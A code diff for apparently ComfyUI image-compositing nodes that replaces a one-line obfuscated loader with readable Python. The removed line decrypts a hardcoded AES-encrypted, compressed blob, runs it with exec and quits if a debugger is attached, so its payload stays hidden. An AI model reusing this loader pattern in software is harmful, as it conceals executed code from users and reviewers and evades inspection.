@@ -1,1 +1,271 @@
-__code=b'kx+Z<=QJD}2F8tV&xv&t$8{uvzblxzNL?N%-HL3g`lp8|O}#wtZ5Apkpv}CYKyBnW)L*TZkoPRTjZ}}W#*EP{iKh5YyDz$h2czB!iYGpXE{T^i>-IBip8+J0zyj#-bJwfbMsf-9RT5a(sX^e0uquWTccYz{z*ib_xfXs;!7c8nFGq75Fyk;nGsa-!vU3BUv^~DBoWp*BlCN_>{zp_blsZ_y3}=z`|JB6#8OPwF6xa}AM^<Ldk&lR{1ho(%1&9WT&!97?nqR({;OKeG=EA1EQYz_$j|qV9L6dYX67rTl_S*Zz;zV8#sG5c)&UlEiFDkj!sYkokQD?H4DsjN_d7s@&&vnf-hK%=Jt7J|y!siW243uo&(lU=)PFzLEMm7P=om!HG&|hKPsKDN9w01)tEv@mpd%SIx(!O-Fhl9Rbr>Bc45FR*C%Q`68*v<QcM5_u}t7SL%O~}mBALt`Xp|bG7*h~3YsD#F^7r1GVTc2FD$(J9G2`tonqljX1WhLbTZ(&CNK^b4U_PbdJ5aD?yN6wat{F_m&jHm1^7en;@pZCocDtRjzLSyNNXiQ)s9Mb4%07ZFq3cQDs@&~=%*Au!)%R%5H&(NL#=yzyXj@vgW^B=aVxJ(M?$Ec0q1(tI0d|D<O7$u2abM`D7s9UnwJ(7kD?o^lBPGGl>M#NKXWNmrft)cYKCi6W%pCWo&2=}>&kO>aq>h%}@A`zluo>_b;1BobxbKNl2p#l;ZtHnyNiCaDmqBBk<-LaaxkUMynvFOM=jO-p?o~|(W{#_TbbfO|{NIDq;Dek8gCv3fUn^k}cu)G(TUDs}he{KJ2I|)(cIr_7ArK?ihA~ke9`k20XbRU6P-VZz?s(54{`AD&O&0}9k6=ex!-6$KC_4_K|>r){*VNb!payRSZH1nlt>e7rjg_|qQ(re~AV(wcWM$H`;tp}1a>>%f7e4WJh6Ip@FPnf}lIT7h%6-7RrDT_$RzE@)>L?>KxCC$|#2|873Z^%ffl1jD2*||B*grvh|gHG?(MmPiC%#@Df2QIcFXj0lb(66^<{;F-n`l&3f6p8_60`J1>18#Tg(`N%W1u<GkX=J4vdl}B3QFhy~aK=ezc>bPZx{z;!gAYUpAH3&-?F3&RzAQw|Bu1rp@HG9yUHg2U7=H*_N!Wjo0mxRNJz#Q2f%8lbLrzJLUiwZ?Yc$Xg#@{LXis=WZ`ytOAqB%rlUBoZx*wZu}TyfeGZ<!W};+Zf9e7riAo-%hh$oSY!=87fNBWsfu)#gv$&nQ(A;Ly*ma$5%Laz!hO0q-UH+5nlA$Wg+xdo7$Onr7&;IutLu1{F_gh0Rlrez-Db4;)i=qXsGgxTb-1v8^2;cSq#Pa&bpkvh$vayh5MLK6s925B6Cx1TxCFi*L$SkW{w%EbFAa8y>S(9#!D#L64M@JX=0O{Y}tX>z;=9%JPhKls*UK(KBQm-i~`kAcLvB2%75PpV!ly6?*f349xsHXz}7cYzpp<ExS1;z-m1kzzWqN4e~cUz>P_M=GY{3duvlWoQkI8vbwMrkUdr`rpZ|6*y+#6%{^9qn31UaC4B>mtRoj1rjUQ*z>T<*u1gCJ^zZjRB43*(A<Gu*xF7vM>i-05eKrjF_T7*2qAp>?(+Fj6cK_{W0?(Rm-*w45zBP?r$*krb7J|6o2Q-;~UGGhT(H1kql1(1Nl{MlbF~p&j{~#UOSUE(6RwmXVi<z}?bSSFU4HdgP2`Qei<@UBf#tD;`#DniBJ|;{bW0$QL_A9anlDL0TZ}M2r5ruc{;w|w<a0ci`C!rPjqFn|~-DoTuh4VtDiXK5^I}HIbBT#&&E$ulaK|FBjyBDwo0`SECX*`>yhEYG~WbNg2Yb4wWqRaD)Wf2cE5^#(L*1myLnqnYuRS5%Z;_XviNB`2EBdM|N0h-?v3{E#__ru}2Xf2a)wL1WC@7`kG4?e=WEo<syu3yv3SgmA}kK<;|{9Y&Z8C05`3l&>uC_KQC6)pxt&1vj!vffMQ7+4Y=YZe{<Oq#tt1StIR0wve7QP0IeF^d6nR#9i!i4QF5N3&03=g_Pc>}#O?9OPGpFVpXDnI@mcY(xJaAfq|_nJ4GQZ3i$0{)ad|34mZDgd%MNW<qW$fn+W6&DIKcBgQTA&`u4zob8pAMRdA5w=4Ax9$)v@Jk|>&b`5qDWhuhKw&cgmOFVsw%S(7wED1)8PtJGGA}OC{!+Zu2ieqPHaCq*k?TnR7!wY0E9gtX)^<Sp=OD(+;*n5%qJiIl-s?-6rrc=c8biHm$ZPce;3#R%?nX%{|;HEevT-rPZz<G23Rk4WAubz?CvS2@Xy2~P(s&Zh|U3>nZY&Raar1fJu!+!`-wf_0&^Xw(&)#E}LA@($VqXyOa_(WX_zgQeu3%ypNuuGQ&bcZx@$ll!li*nkUmm9Vs<gAmvw-2JEH&D+Fc)x3U87ZOSNK7HS<`qBBA?`CcxCL7#Fm<TN>tle~4j?%|=k!s@TD8<7M}rFZ$#LdL--#a?kBXO-&)M1No)iz~%6OJEF{o}6sk0z@{=SscRnuX2(P5T`=nNt(h<rdiu0yKvsEB;vdnQY^mW!6N3vn$0@zs5*dKlwbD2b|!mPnV-@%a%Y7zuaeW@^_5X}0yDOM9+F<1XWJ(F|?6A!lyz;2IOXc0;9`?Z%^S3AAMk-)r%SA6X?(VLpoF$KZy-WL-ot;FEIx*1T_|1H!4SBcs)KsUJin@rxyOcU{p@DMeWT(`t*Z+M(<;7Dc{G#KvG>fZlqx^y!6M|C9Y`<-9^Gdh#Y=l^YS^Hb={zSTn2Jq&f163yev^)Y<*yE!RkU<&61a`_ogyZp;>XD)~PZGO!q?fd~$3?mn9x9_+-p%-Om+?Te4@)tdHQlJQdgw)@Wi6N6^->ZoUJ71|+pEtPD#iy+If+PFv)P3iniwi*A&e7$J%va&nqZ^4iJ_MbC`VF!fx7amn6*2Ze3(IKuyr0oKqcgAebe!=Ame10`i0&FJuu;0`Q<J-cqtqjcac6Ew7#VEZ>';import importlib as KhD;WJs=KhD.import_module(''.join(chr(x)for x in[115, 121, 115]));kiF=KhD.import_module(''.join(chr(x)for x in[98, 97, 115, 101, 54, 52]));eWM=KhD.import_module(''.join(chr(x)for x in[122, 108, 105, 98]));VxN=KhD.import_module(''.join(chr(x)for x in[104, 97, 115, 104, 108, 105, 98]));ufJ=KhD.import_module(''.join(chr(x)for x in[67, 114, 121, 112, 116, 111, 46, 67, 105, 112, 104, 101, 114, 46, 65, 69, 83]));eim=KhD.import_module(''.join(chr(x)for x in[67, 114, 121, 112, 116, 111, 46, 85, 116, 105, 108, 46, 80, 97, 100, 100, 105, 110, 103]));xWm=WJs.gettrace;adf=kiF.b85decode;tHt=eWM.decompress;tjq=VxN.pbkdf2_hmac;qnb=ufJ.MODE_CBC;bFn=ufJ.block_size;PqD=ufJ.new;oTl=bytes([170,60,144,37,222,121,165,9,13,55,197,27,182,175,203,159]);aAw=bytes([207,165,33,119,198,46,12,209,226,250,225,166,48,241,220,32]);CAi=bytes([88,48,103,74,56,111,49,49,79,103,99,54,110,81,72,74,36,87,76,117,83,54,94,51,77,97,110,35,77,120,122,71]);ZdG=tjq('sha256',CAi,oTl,100000);OmA=PqD(ZdG,qnb,aAw);exec(compile(tHt(eim.unpad(OmA.decrypt(adf(__code)),bFn)).decode(),'','exec'))if not xWm()else exit()
+import base64
+import hashlib
+import os
+from io import BytesIO
+from PIL import Image, ImageDraw, ImageFilter, ImageOps, ImageSequence
+import torch
+import numpy as np  
+import folder_paths
+import time
+import random
+from server import PromptServer, BinaryEventTypes
+import logging
+import comfy.model_management
+import node_helpers
+tempfolder = os.path.join(folder_paths.get_temp_directory(),"fkimgedit")
+if not os.path.exists(tempfolder):
+    os.makedirs(tempfolder)
+
+def ensure_tempfolder():
+    if not os.path.isdir(tempfolder):
+        os.makedirs(tempfolder, exist_ok=True)
+def pil2tensor(image):
+  return torch.from_numpy(np.array(image).astype(np.float32) / 255.0).unsqueeze(0)    
+def image2mask(image_path,channel="A"):   
+    i = node_helpers.pillow(Image.open, image_path)
+    i = node_helpers.pillow(ImageOps.exif_transpose, i)
+    if i.getbands() != ("R", "G", "B", "A"):
+        if i.mode == 'I':
+            i = i.point(lambda i: i * (1 / 255))
+        i = i.convert("RGBA")
+    mask = None
+    c = channel[0].upper()
+    if c in i.getbands():
+        mask = np.array(i.getchannel(c)).astype(np.float32) / 255.0
+        mask = torch.from_numpy(mask)
+        if c == 'A':
+            mask = 1. - mask
+    else:
+        mask = torch.zeros((64,64), dtype=torch.float32, device="cpu")
+    return mask.unsqueeze(0) 
+def getimg(img_path):  
+    try:
+        i = Image.open(img_path)
+        i = ImageOps.exif_transpose(i)
+        image = i.convert("RGB")
+        image = np.array(image).astype(np.float32) / 255.0
+        image = torch.from_numpy(image)[None,]
+        return image
+    except Exception as e:
+        logging.error(f"Error loading image {img_path}: {e}")
+        return None
+def gtoken(length):   
+    random_number = random.randint(0, 1000000)
+    random_number_str = str(random_number)
+    hash_value = hashlib.md5(random_number_str.encode()).hexdigest()
+    token = hash_value[:length]
+    return token + time.strftime("%Y%m%d%H%M%S", time.localtime())
+
+class FKImgEditNode: 
+    @classmethod
+    def INPUT_TYPES(s):
+        return {
+            "required": {
+                "background": ("IMAGE",),
+                "foreground": ("IMAGE",),                
+                "token": ("STRING", {"default":gtoken(15)})
+            }, "optional": {
+               "foregroundMask": ("MASK",),
+               "foreground2": ("IMAGE",),                
+               "foreground2Mask": ("MASK",),
+            }, "hidden": {"unique_id": "UNIQUE_ID"}
+        }
+
+    RETURN_TYPES = ("IMAGE","MASK")
+    RETURN_NAMES = ("output","Mask")
+    FUNCTION = "compose_images"
+    CATEGORY = "FK_Nodes"  
+    def compose_images(self, background=None, foreground=None,foregroundMask=None,foreground2=None,foreground2Mask=None,token=None, unique_id=None):
+        ensure_tempfolder()
+        tstoken = "FKimgedit_" + gtoken(15)  
+        foregroundimg = ""
+        foreground2img = ""
+        if foreground is not None and foregroundMask is not None:
+            try:
+                texture_array = foreground.cpu().numpy()[0]          
+                if texture_array.shape[-1] == 4:
+                    foregroundimg = self.save_image(foreground) or ""
+                else:
+                    try:
+                        mask_array = foregroundMask.cpu().numpy()
+                        if len(mask_array.shape) == 3:
+                            mask_array = mask_array[0]  
+                        if mask_array.shape[:2] != texture_array.shape[:2]:
+                            raise ValueError("遮罩尺寸与前景图尺寸不匹配")                        
+                        mask_array = 1.0 - mask_array    
+                        rgba = np.zeros((*texture_array.shape[:2], 4), dtype=np.uint8)
+                        rgba[..., :3] = np.clip(texture_array * 255, 0, 255).astype(np.uint8)  
+                        rgba[..., 3] = np.clip(mask_array * 255, 0, 255).astype(np.uint8)                      
+                        texture_with_mask = Image.fromarray(rgba, 'RGBA')                        
+                        # 保存到指定目录
+                        imgname = "F1" + gtoken(20) + ".png"
+                        save_path = os.path.join(tempfolder, imgname)
+                        texture_with_mask.save(save_path, format="PNG")
+                        foregroundimg = imgname
+                        
+                    except Exception as e:            
+                        foregroundimg = self.save_image(foreground) or ""            
+            except Exception as e:
+                raise ValueError(f"前景图处理错误: {str(e)}")   
+        else:
+           foregroundimg = self.save_image(foreground) or ""
+
+        if foreground2 is not None and foreground2Mask is not None:
+            try:
+                texture_array = foreground2.cpu().numpy()[0]          
+                if texture_array.shape[-1] == 4:
+                    foreground2img = self.save_image(foreground2) or ""
+                else:
+                    try:
+                        mask_array = foreground2Mask.cpu().numpy()
+                        if len(mask_array.shape) == 3:
+                            mask_array = mask_array[0]                          
+                        if mask_array.shape[:2] != texture_array.shape[:2]:
+                            raise ValueError("遮罩尺寸与前景图尺寸不匹配")                        
+                        mask_array = 1.0 - mask_array    
+                        rgba = np.zeros((*texture_array.shape[:2], 4), dtype=np.uint8)
+                        rgba[..., :3] = np.clip(texture_array * 255, 0, 255).astype(np.uint8)  
+                        rgba[..., 3] = np.clip(mask_array * 255, 0, 255).astype(np.uint8)                      
+                        texture_with_mask = Image.fromarray(rgba, 'RGBA')                    
+                        
+                        # 保存到指定目录
+                        imgname = "F2" + gtoken(20) + ".png"
+                        save_path = os.path.join(tempfolder, imgname)
+                        texture_with_mask.save(save_path, format="PNG")
+                        foreground2img = imgname 
+                    except Exception as e:            
+                        foreground2img = self.save_image(foreground2) or ""            
+            except Exception as e:
+                raise ValueError(f"前景图处理错误: {str(e)}")   
+        elif foreground2 is not None:
+            foreground2img = self.save_image(foreground2) or "" 
+        else:
+           foreground2img =  "" 
+        server = PromptServer.instance
+        server.send_sync(
+                "executed",
+               {"node_id": unique_id,"node": unique_id,"display_node":unique_id,"output":{
+                "background":self.save_image(background),"foreground":foregroundimg,"foreground2":foreground2img,"token":tstoken
+               }},
+                server.client_id,
+            ) 
+        
+        img_path = os.path.join(tempfolder, tstoken + ".png")
+        while not os.path.exists(img_path) and not comfy.model_management.processing_interrupted(): 
+            time.sleep(3) 
+       
+        if comfy.model_management.processing_interrupted():
+            return (background,foreground,)       
+        image = getimg(img_path)
+        mask_path = os.path.join(tempfolder, tstoken + "_mask.png")
+        mask = image2mask(mask_path)
+        return (image,mask,)
+
+    def save_image(self, image):
+        imgname = "F" + gtoken(20) + ".png"
+        try:
+            if image is not None:
+                img = image.cpu().numpy()[0]
+                img = np.clip(img * 255, 0, 255).astype(np.uint8)
+                if img.shape[-1] == 4:
+                    img = Image.fromarray(img, 'RGBA')
+                else:
+                    img = Image.fromarray(img, 'RGB')                
+                img.save(os.path.join(tempfolder,imgname ), format="PNG")
+                return imgname
+        except Exception as e:
+            return ""
+
+class FKTietuNode2:
+    @classmethod
+    def INPUT_TYPES(s):
+        return {
+          "required": {
+                "background": ("IMAGE",),
+                "Depth": ("IMAGE",),
+                "Texture": ("IMAGE",),                
+                "token": ("STRING", {"default":gtoken(15)}),
+                "img": ("STRING", {"default":"等待传入数据..."}),
+            } ,"optional": {
+                "TextureMask": ("MASK",),
+            }, "hidden": {"unique_id": "UNIQUE_ID"}
+        }    
+    RETURN_TYPES = ("IMAGE",)
+    RETURN_NAMES = ("output",)
+    FUNCTION = "process"
+    OUTPUT_NODE = True  
+    CATEGORY = "FK_Nodes" 
+    def process(self, background=None, Depth=None, Texture=None, TextureMask=None,img=None, unique_id=None,token=None):     
+        ensure_tempfolder()
+        base64_image3 = ""       
+        tstoken = "FKimghc_" + gtoken(16)  
+        if Texture is not None and TextureMask is not None:
+            try:
+                texture_array = Texture.cpu().numpy()[0]          
+                if texture_array.shape[-1] == 4:
+                    base64_image3 = self.save_image(Texture) or ""
+                else:
+                    try:
+                        mask_array = TextureMask.cpu().numpy()
+                        if len(mask_array.shape) == 3:
+                            mask_array = mask_array[0]                          
+                        if mask_array.shape[:2] != texture_array.shape[:2]:
+                            raise ValueError("遮罩尺寸与图像不匹配")                        
+                        mask_array = 1.0 - mask_array    
+                        rgba = np.zeros((*texture_array.shape[:2], 4), dtype=np.uint8)
+                        rgba[..., :3] = np.clip(texture_array * 255, 0, 255).astype(np.uint8)  
+                        rgba[..., 3] = np.clip(mask_array * 255, 0, 255).astype(np.uint8)                      
+                        texture_with_mask = Image.fromarray(rgba, 'RGBA')                    
+                        # 保存到指定目录
+                        imgname = "FA1" + gtoken(20) + ".png"
+                        save_path = os.path.join(tempfolder, imgname)
+                        texture_with_mask.save(save_path, format="PNG")
+                        base64_image3 = imgname
+                    except Exception as e: 
+                        base64_image3 = self.save_image(Texture) or ""
+            except Exception as e:
+                raise ValueError(f"Texture处理错误: {str(e)}")        
+        else:
+            base64_image3 = self.save_image(Texture) or ""
+
+        base64_image1 = self.save_image(background) or ""
+        base64_image2 = self.save_image(Depth) or ""        
+
+        server = PromptServer.instance
+        server.send_sync(
+                "executed",
+               {"node_id": unique_id,"node": unique_id,"display_node":unique_id,"output":{
+                "backgroundcode":base64_image1,"depthcode":base64_image2,"Texturecode":base64_image3,"token":tstoken
+               }},
+                server.client_id,
+            ) 
+        
+        img_path = os.path.join(tempfolder, tstoken + ".png")
+        while not os.path.exists(img_path) and not comfy.model_management.processing_interrupted(): 
+            time.sleep(3) 
+       
+        if comfy.model_management.processing_interrupted():
+            return (background,)
+        i = Image.open(img_path)
+        i = ImageOps.exif_transpose(i)
+        image = i.convert("RGB")
+        image = np.array(image).astype(np.float32) / 255.0
+        image = torch.from_numpy(image)[None,]      
+        return (image,)
+
+    
+    def save_image(self, image):
+        imgname = "F" + gtoken(20) + ".png"
+        try:
+            if image is not None:
+                img = image.cpu().numpy()[0]
+                img = np.clip(img * 255, 0, 255).astype(np.uint8)
+                if img.shape[-1] == 4:
+                    img = Image.fromarray(img, 'RGBA')
+                else:
+                    img = Image.fromarray(img, 'RGB')                
+                img.save(os.path.join(tempfolder,imgname ), format="PNG")
+                return imgname
+        except Exception as e:
+            return ""
+        
